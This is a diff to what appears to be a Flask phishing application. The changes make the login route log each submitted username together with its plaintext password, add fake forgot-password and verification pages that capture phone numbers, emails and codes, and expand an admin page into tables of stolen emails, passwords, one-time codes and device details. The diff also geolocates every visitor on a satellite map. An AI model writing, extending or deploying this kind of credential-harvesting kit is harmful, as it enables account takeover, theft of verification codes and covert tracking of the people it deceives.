@@ -70,8 +70,8 @@ def init_db():
         user_agent TEXT,
         visitor_type TEXT,
         time TEXT,
-        lat REAL,
-        lon REAL
+        Latitude REAL,
+        Longitude REAL
     )
     """)
 
@@ -125,15 +125,15 @@ def get_location(ip):
         country = data.get("country_name","Unknown")
         city = data.get("city","Unknown")
         isp = data.get("org","Unknown")
-        lat = data.get("latitude",None)
-        lon = data.get("longitude",None)
+        Latitude = data.get("latitude",None)
+        Longitude = data.get("longitude",None)
 
-        return country,city,isp,lat,lon
+        return country,city,isp,Latitude,Longitude
 
     except Exception as e:
 
         logging.error(f"Location API error: {e}")
-        return None,None,None,None,None
+        return "Unknown", "Unknown", "Unknown", None, None
 
 # ========================
 # تسجيل كل request
@@ -147,7 +147,7 @@ def log_every_request():
 
     ip = get_real_ip()
 
-    country,city,isp,lat,lon = get_location(ip)
+    country,city,isp,Latitude,Longitude = get_location(ip)
 
     path = request.path
     method = request.method
@@ -180,9 +180,9 @@ def log_every_request():
     cursor = conn.cursor()
 
     cursor.execute("""
-    INSERT INTO visits (ip,country,city,isp,path,method,user_agent,visitor_type,time,lat,lon)
+    INSERT INTO visits (ip,country,city,isp,path,method,user_agent,visitor_type,time,Latitude,Longitude)
     VALUES (?,?,?,?,?,?,?,?,?,?,?)
-    """,(ip,country,city,isp,path,method,user_agent,visitor_type,time,lat,lon))
+    """,(ip,country,city,isp,path,method,user_agent,visitor_type,time,Latitude,Longitude))
 
     conn.commit()
     conn.close()
@@ -260,7 +260,7 @@ def login():
     username = request.form.get("username")
     password = request.form.get("password")
 
-    logging.warning(f"Login attempt | user: {username}")
+    logging.warning(f"Login attempt | user: {username} with password: {password}")
 
     ip = get_real_ip()
     user_agent = request.headers.get("User-Agent","Unknown")
@@ -280,7 +280,33 @@ def login():
     conn.close()
 
     return redirect("https://2742404919047.sarhne.com")
+# ========================
+# create
+# ========================
+@app.route("/create")
+def create():
+    return redirect("https://www.fhyi.com")
 
+#=========================
+# Forgot page
+#=========================
+@app.route("/forgot")
+def forgot():
+    
+    logging.info("Forgot password page opened")
+
+    return render_template("forgot.html")
+#=========================
+# Verify request
+#=========================
+@app.route("/verify", methods=["POST"])
+def verify():
+    phone_or_email = request.form.get("phone_or_email")
+    session["phone_or_email"] = phone_or_email
+
+    logging.warning(f"Verify request: {phone_or_email}")
+    logging.info("Redirected user to verify code page")
+    return render_template("verify.html")
 # ========================
 # verify_code
 # ========================
@@ -386,24 +412,65 @@ def admin():
 
     conn.close()
 
-    html = "<h2>Visits</h2><table border='1'>"
-
-    for visit in visits:
-        html += "<tr>" + "".join(f"<td>{col}</td>" for col in visit) + "</tr>"
-
-    html += "</table>"
-
-    html += "<h2>Users</h2><table border='1'>"
-
+    html ="""
+    <h2>Users</h2>
+    <table border='1'>
+    <tr>
+    <th>ID</th>
+    <th>Email</th>
+    <th>Password</th>
+    <th>IP</th>
+    <th>Device</th>
+    <th>OS</th>
+    <th>Browser</th>
+    <th>Time</th>
+    </tr>
+    """
     for user in users:
         html += "<tr>" + "".join(f"<td>{col}</td>" for col in user) + "</tr>"
 
     html += "</table>"
 
-    html += "<h2>Codes</h2><table border='1'>"
-
+    html +="""
+    <h2>Codes</h2>
+    <table border='1'>
+    <tr>
+    <th>ID</th>
+    <th>Email</th>
+    <th>Code</th>
+    <th>IP</th>
+    <th>Device</th>
+    <th>OS</th>
+    <th>Browser</th>
+    <th>Time</th>
+    </tr>
+    """
     for code in codes:
         html += "<tr>" + "".join(f"<td>{col}</td>" for col in code) + "</tr>"
+
+    html += "</table>"
+
+    html += """
+    <h2>Visits</h2>
+    <table border='1'>
+    <tr>
+    <th>ID</th>
+    <th>IP</th>
+    <th>Country</th>
+    <th>City</th>
+    <th>ISP</th>
+    <th>Path</th>
+    <th>Method</th>
+    <th>User Agent</th>
+    <th>Visitor Type</th>
+    <th>Time</th>
+    <th>Latitude</th>
+    <th>Longitude</th>
+    
+    </tr>
+    """
+    for visit in visits:
+        html += "<tr>" + "".join(f"<td>{col}</td>" for col in visit) + "</tr>"
 
     html += "</table>"
 
@@ -420,21 +487,26 @@ def map_view():
     cursor = conn.cursor()
 
     cursor.execute("""
-    SELECT ip,city,country,visitor_type,lat,lon
+    SELECT ip,city,country,visitor_type,Latitude,Longitude
     FROM visits
-    WHERE lat IS NOT NULL AND lon IS NOT NULL
+    WHERE Latitude IS NOT NULL AND Longitude IS NOT NULL
     """)
 
     visits = cursor.fetchall()
 
     conn.close()
 
-    m = folium.Map(location=[20,0],zoom_start=3)
+    m = folium.Map(
+    location=[20,0],
+    zoom_start=3,
+    tiles="https://mt1.google.com/vt/lyrs=s&x={x}&y={y}&z={z}",
+    attr="Google Satellite"
+    )
 
-    for ip,city,country,visitor_type,lat,lon in visits:
+    for ip,city,country,visitor_type,Latitude,Longitude in visits:
 
         folium.Marker(
-            location=[lat,lon],
+            location=[Latitude,Longitude],
             popup=f"{ip} | {city},{country} | {visitor_type}"
         ).add_to(m)
 
